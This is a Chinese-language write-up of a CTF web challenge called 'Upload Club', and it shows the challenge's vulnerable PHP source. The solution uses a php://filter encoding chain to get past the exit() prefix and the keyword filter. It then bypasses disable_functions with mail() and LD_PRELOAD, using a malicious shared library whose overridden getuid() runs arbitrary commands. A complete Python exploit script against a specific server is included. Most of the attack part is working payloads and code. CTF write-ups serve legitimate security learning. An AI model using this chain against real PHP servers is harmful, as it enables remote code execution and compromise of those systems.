# Upload Club

> 知识点: 数组[解析变量名, 另类二次编码绕过, 过滤器绕死亡函数 exit, file_get_contents 与 require_once 解析区别, mail() 绕过 disable_functions, 解析ELF文件解密flag
>

源码

```php
<title>neepu_sec.club</title>
<?php
error_reporting(0);
highlight_file(__FILE__);
$uploadclub = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : md5($_SERVER['REMOTE_ADDR']));
$uploadclub = basename(str_replace(['.','-','(','`','<'],['','','','',''], $uploadclub));
@mkdir('uploads/'.$uploadclub);
@chdir('uploads/'.$uploadclub);
var_dump("Upload: uploads/".$uploadclub);
$check = file_get_contents('php://input');
if(preg_match('/25/', $check)) {
    die("<br />No more 25 :(");
}else {
    extract($_POST);
    foreach ($_POST as $key => $value) {
        $key = $value;
    }
}
if(isset($_POST['neepu_sec.club'])) {
    $content = $key;
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64|zlib|string|tripledes|ini|htaccess|\\|#|\_|\<\?/i', $content)) {
        die('<br />hacker!!!');
    }
    $content = str_replace('.php','neepu',$content);
    $content = str_replace('.phtml','neepu',$content);
    file_put_contents($content,'<?php exit();'.$content);
    chdir('..');
    if(!stripos(file_get_contents($content),'<?') && !stripos(file_get_contents($content),'php')) {
        require_once($content);
    }
}
?>
```

上传文件

```
neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?%3Chp%20phpipfn(o;)%3E?/resource=ricky
X-Forwarded-For: data:,123456
```

包含文件

```
neepu[sec.club=data:,123456/ricky
X-Forwarded-For: data:,123456
```

禁用函数

```
passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv,chmod,posix_mkfifo,pg_lo_import,dbmopen,dbase_open,define_syslog_variables,posix_getpwuid,posix_uname,proc_close,pclose,proc_nice,proc_terminate,curl_exec,curl_multi_exec,parse_ini_file,show_source,fopen,copy,rename,readfile,tmpfile,tempnam,touch,link,file,ftp_connect,ftp_ssl_connect
```

使用 mail() 函数绕过 disable_functions

```
neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<hp pomevu_lpaoed_difel$(F_LISE'[veli]''[mt_panem]'',t/pme/iv_lil'b;)upetvn'(DLP_EROLDA/=mt/pvelil_bi)'p;tune(v_"velimc=dsl/ )"m;ia(la','a','a')'e;hc oifelg_tec_noettn(s/'mt/p0_tuup.txt't;)>?');/resource=ricky
```

> PHP的 `mail()` 函数调用 `execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "], ...)` 。由于这种实现，如果我们使用自写动态库设置环境变量 `LD_PRELOAD` ，从而修改 `/bin/sh` 的行为并获得命令执行。 

即使 `/usr/sbin/sendmail` 不存在, 也可以使用, 重写 `getuid()` 函数

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(char *cmd) {
  char buf[512];
  strcpy(buf, cmd);
  strcat(buf, " > /tmp/_0utput.txt");
  system(buf);}

int getuid() {
  char *cmd;
  if (getenv("LD_PRELOAD") == NULL) { return 0; }
  unsetenv("LD_PRELOAD");
  if ((cmd = getenv("_evilcmd")) != NULL) {
    payload(cmd);
  }
  return 1;
}
```

编译

```
gcc -Wall -fPIC -shared -o evil.so evil.c -ldl
```

采用 `move_uploaded_file` 函数进行多文件上传, 访问 /getflag, 得到加密信息, base64 提取ELF文件, IDA逆向写出解密函数得到 flag, 贴上最后的脚本

```python
# -*-coding:utf-8-*-
import requests
import re

url = "http://81.70.101.91:28100/index.php"

def upload():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "X-Forwarded-For": "data:,123456",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    # phpinfo()
    # upload = "neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?%3Chp%20phpipfn(o;)%3E?/resource=ricky"
    # ls /
    # upload = "neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<hp pomevu_lpaoed_difel$(F_LISE'[veli]''[mt_panem]'',t/pme/iv_lil'b;)upetvn'(DLP_EROLDA/=mt/pvelil_bi)'p;tune(v_\"velimc=dsl/ )\"m;ia(la','a','a')'e;hc oifelg_tec_noettn(s/'mt/p0_tuup.txt't;)>?');/resource=ricky"
    # /getflag
    upload = "neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<hp pomevu_lpaoed_difel$(F_LISE'[veli]''[mt_panem]'',t/pme/iv_lil'b;)upetvn'(DLP_EROLDA/=mt/pvelil_bi)'p;tune(v_\"velimc=dg/telfga)\"m;ia(la','a','a')'e;hc oifelg_tec_noettn(s/'mt/p0_tuup.txt't;)>?/resource=ricky"
    # cat /getflag |base64
    # upload = "neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<hp pomevu_lpaoed_difel$(F_LISE'[veli]''[mt_panem]'',t/pme/iv_lil'b;)upetvn'(DLP_EROLDA/=mt/pvelil_bi)'p;tune(v_\"velimc=dac tg/telfga| abes46)\"m;ia(la','a','a')'e;hc oifelg_tec_noettn(s/'mt/p0_tuup.txt't;)>?/resource=ricky"
    # nl /flag
    # upload = "neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<hp pomevu_lpaoed_difel$(F_LISE'[veli]''[mt_panem]'',t/pme/iv_lil'b;)upetvn'(DLP_EROLDA/=mt/pvelil_bi)'p;tune(v_\"velimc=dln/ lfga)\"m;ia(la','a','a')'e;hc oifelg_tec_noettn(s/'mt/p0_tuup.txt't;)>?/resource=ricky"

    res = requests.post(url=url, headers=headers, data=upload)

def require():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "X-Forwarded-For": "data:,123456",
    }
    require_once = {"neepu[sec.club": "data:,123456/ricky"}
    files = {"evil": open("./evil.so", "rb")}
    res = requests.post(url=url, headers=headers, data=require_once, files=files)
    try:
        neepu = re.search("Neepu will give you flag: (?P<neepu>((.*)+\-))", res.text)
        return neepu.group('neepu')
    except:
        print(res.text)


def base64_decode(s, dictionary):
    base64inv = {}
    for i in range(len(dictionary)):
        base64inv[dictionary[i]] = i

    s = s.replace("\n", "")
    if not re.match(r"^([{alphabet}]{{4}})*([{alphabet}]{{3}}=|[{alphabet}]{{2}}==)?$".format(alphabet = dictionary), s):
        raise ValueError("Invalid input: {}".format(s))

    if len(s) == 0:
        return ""
    p = "" if (s[-1] != "=") else "AA" if (len(s) > 1 and s[-2] == "=") else "A"
    r = ""
    s = s[0:len(s) - len(p)] + p
    for c in range(0, len(s), 4):
        n = (base64inv[s[c]] << 18) + (base64inv[s[c+1]] << 12) + (base64inv[s[c+2]] << 6) + base64inv[s[c+3]]
        r += chr((n >> 16) & 255) + chr((n >> 8) & 255) + chr(n & 255)
    return r[0:len(r) - len(p)]

if __name__ == '__main__':
    flag = ''
    upload()
    neepu = require()
    dictionary = "NepuTLaOyRzh/i*YHn%QsdUDqWErk+)o(jVSPmZ@$GAbwl^JtxB!cCXfIgMv&FK#-"
    try:
        r = base64_decode(neepu, dictionary)
    except:
        r = ''
    for i in range(len(r)):
        flag += chr(ord(r[i]) - 4)
    print(flag)
```

